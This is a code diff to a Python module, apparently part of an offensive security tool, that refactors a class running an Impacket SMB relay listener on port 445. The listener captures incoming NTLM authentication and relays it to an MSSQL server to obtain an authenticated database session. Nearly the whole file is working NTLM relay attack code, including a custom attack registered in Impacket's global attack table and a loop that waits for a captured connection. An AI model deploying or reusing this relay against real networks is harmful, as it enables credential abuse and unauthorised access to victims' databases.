@@ -6,8 +6,9 @@ from typing import Optional
 # Third party imports
 from loguru import logger
 
-from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
 from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS, ProtocolAttack
+from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
+
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
@@ -24,7 +25,6 @@ class RelayMSSQL:
     """
 
     def __init__(self, hostname: str):
-        self.relay_servers = []
         self.threads = set()
         self.captured_client = None  # Store single captured client
         self.server_instance = None  # Will be set when waiting for connection
@@ -32,12 +32,10 @@ class RelayMSSQL:
         # Only register MSSQL protocol client (avoid loading all protocols)
         minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}
 
-        logger.info("Starting NTLM Relay listener")
         self.targets_processor = TargetsProcessor(
             singleTarget=f"mssql://{hostname}",
             protocolClients=minimal_protocol_clients,
         )
-        self.relay_servers.append(SMBRelayServer)
 
         # Create custom attack class that references this instance
         self._register_attack()
@@ -68,41 +66,41 @@ class RelayMSSQL:
                 }
                 return True
 
+        # Register in the GLOBAL Impacket attacks dictionary
         PROTOCOL_ATTACKS["MSSQL"] = CustomMSSQLAttack
-        logger.debug("Registered CustomMSSQLAttack for MSSQL protocol")
+        logger.debug("Registered CustomMSSQLAttack in global PROTOCOL_ATTACKS")
 
     def start(self, smb2support: bool = False, ntlmchallenge: str = None):
         # Only use MSSQL protocol client
         minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}
 
-        for server in self.relay_servers:
-            # Set up config
-            c = NTLMRelayxConfig()
+        # Set up config
+        c = NTLMRelayxConfig()
 
-            c.setProtocolClients(minimal_protocol_clients)
-            c.setTargets(self.targets_processor)
-            c.setExeFile(None)
-            c.setCommand(None)
-            c.setEnumLocalAdmins(None)
-            c.setAddComputerSMB(None)
-            c.setDisableMulti(None)
-            c.setKeepRelaying(False)
-            c.setEncoding(sys.getdefaultencoding())
-            c.setMode("RELAY")
-            c.setAttacks(PROTOCOL_ATTACKS)
-            c.setLootdir(".")
-            c.setOutputFile(None)
-            c.setdumpHashes(False)
-            c.setSMB2Support(smb2support)
-            c.setSMBChallenge(ntlmchallenge)
-            c.setInterfaceIp("0.0.0.0")
+        c.setProtocolClients(minimal_protocol_clients)
+        c.setTargets(self.targets_processor)
+        c.setExeFile(None)
+        c.setCommand(None)
+        c.setEnumLocalAdmins(None)
+        c.setAddComputerSMB(None)
+        c.setDisableMulti(
+            True
+        )  # Single target mode - relay immediately during SessionSetup
+        c.setKeepRelaying(False)
+        c.setEncoding(sys.getdefaultencoding())
+        c.setMode("RELAY")
+        c.setAttacks(PROTOCOL_ATTACKS)  # Use global PROTOCOL_ATTACKS
+        c.setLootdir(".")
+        c.setOutputFile(None)
+        c.setdumpHashes(False)
+        c.setSMB2Support(smb2support)
+        c.setSMBChallenge(ntlmchallenge)
+        c.setInterfaceIp("0.0.0.0")
+        c.setListeningPort(445)
 
-            if server is SMBRelayServer:
-                c.setListeningPort(445)
-
-            s = server(c)
-            s.start()
-            self.threads.add(s)
+        s = SMBRelayServer(c)
+        s.start()
+        self.threads.add(s)
         return c
 
     def wait_for_connection(
@@ -123,6 +121,16 @@ class RelayMSSQL:
 
         start_time = time.time()
         while time.time() - start_time < timeout:
+            # Check if all targets have been processed (authentication failed)
+            # When keepRelaying=False and auth fails, TargetsProcessor has no more targets
+            if (
+                len(self.targets_processor.generalCandidates) == 0
+                and len(self.targets_processor.namedCandidates) == 0
+            ):
+                if len(self.targets_processor.failedAttacks) > 0:
+                    return None
+
+            # Check if we captured a successful client
             if self.captured_client:
                 logger.success("Relayed connection captured!")
 
@@ -147,21 +155,17 @@ class RelayMSSQL:
 
                 return db_context
 
-            time.sleep(0.5)
+            time.sleep(0.1)
 
         logger.warning(f"No relayed connection received within {timeout} seconds")
         return None
 
     def stop_servers(self):
         """Stop all relay servers."""
-        todelete = []
-        for thread in self.threads:
-            if isinstance(thread, tuple(self.relay_servers)):
+        for thread in list(self.threads):
+            if isinstance(thread, SMBRelayServer):
                 thread.server.shutdown()
-                todelete.append(thread)
-        for thread in todelete:
-            self.threads.remove(thread)
-            del thread
+            self.threads.discard(thread)
 
     def __del__(self) -> None:
         """Destructor - ensure relay servers are stopped."""
